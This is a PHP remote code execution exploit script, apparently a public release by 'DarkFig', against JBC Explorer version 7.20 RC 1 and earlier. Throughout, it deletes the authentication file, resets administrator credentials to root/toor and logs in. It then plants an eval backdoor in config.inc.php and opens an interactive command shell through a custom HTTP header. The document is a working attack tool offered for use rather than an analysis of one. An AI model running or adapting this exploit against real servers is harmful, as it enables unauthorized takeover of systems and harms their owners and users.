#!/usr/bin/php
<?php
#
# This file require the PhpSploit class.
# If you want to use this class, the latest
# version can be downloaded from acid-root.new.fr.
##################################################
error_reporting(E_ALL ^ E_NOTICE);
require('phpsploitclass.php');

head();
if($argc < 3) usage();

$url = getparam('url', true);
$prx = getparam('proxy', false);
$pra = getparam('proxyauth', false);
$cod = 'eval($_SERVER[HTTP_SHELL]);';

$xpl = new phpsploit();
$xpl->agent('Mozilla Firefox');
$xpl->allowredirection(1);
$xpl->cookiejar(1);

if($prx) $xpl->proxy($prx);
if($pra) $xpl->proxyauth($pra);

print "0x01>Deleting the file auth.inc.php";
$xpl->post($url.'dirsys/modules/auth.php', 'suppr=1');

print "\n0x02>Creating the file auth.inc.php";
$xpl->post($url.'dirsys/modules/auth.php', 'login=root&password=toor');

print "\n0x03>Trying to log in as Administrator";
$xpl->post($url.'dirsys/modules/auth.php', 'login=root&password=toor');

// Minimum data necessary (fwrite without quote)
$minimdata =
'WIDTH_TREE_FRAME=1&FRAME_BORDER=1&WIDTH_FRAME_BORDER=1&WIDTH_FRAME_SP'.
'ACING=1&SCROLING_TREE_FRAME=1&RESIZE_FRAME=1&WIDTH_TD_SIZE=1&WIDTH_TD'.
'_TYPE=1&WIDTH_TD_DATE=1&STYLE=1&TOTALSIZE=1&CHECK_MAJ=1&IMAGE_BROWSER'.
'=1&IMAGE_TN=1&GD2=1&IMAGE_JPG=1&IMAGE_GIF=1&IMAGE_BMP=1&IMAGE_TN_SIZE'.
'=1&IMAGE_TN_COMPRESSION=1&NB_COLL_TN=1&EXIF_READER=1&SLIDE_SHOW=1&DEB'.
'UG=0;'.urlencode($cod).'//&SLIDE_SHOW_INT=1&BACK=1&WRITE_TN=1&AUTO_RE'.
'SIZE=1&DETAILS=1&DIRINFO_LIFE=1&activer_Message=1';

print "\n0x04>Creating the file config.inc.php";
$xpl->post($url.'dirsys/modules/config/post.php', $minimdata);
print "\n0x05>Now enter your commands";

do
{
        $xpl->addheader('Shell', "@system($cmd);");
        $xpl->get($url.'dirsys/config.inc.php');
        print $xpl->getcontent()."\n0x06>";
}
while(!eregi('^quit|exit$', $cmd = trim(fgets(STDIN))));

exit(0);


function getparam($param,$opt='')
{
        global $argv;

        foreach($argv as $value => $key)
        {
                if($key == '-'.$param)
                   return $argv[$value+1];
        }

        if($opt)
           usage();
        else
           return FALSE;
}
function head()
{
        print
        "\nJBC Explorer <= V7.20 RC 1\n".
        "Remote Code Execution Exploit\n\n".
        "by DarkFig <gmdarkfig (at) gmail (dot) com>\n".
        "http://acid-root.new.fr/\n".
        "#acidroot@irc.worldnet.net\n\n";
}

function usage()
{
        print
        "Usage:\n".
        "sploit.php -url <url> [Options]\n\n".
        "Options:\n".
        "-proxy <proxyhost:proxyport>".
        "\n-proxyauth <proxyuser:proxypwd>\n";

        exit(1);
}

?>
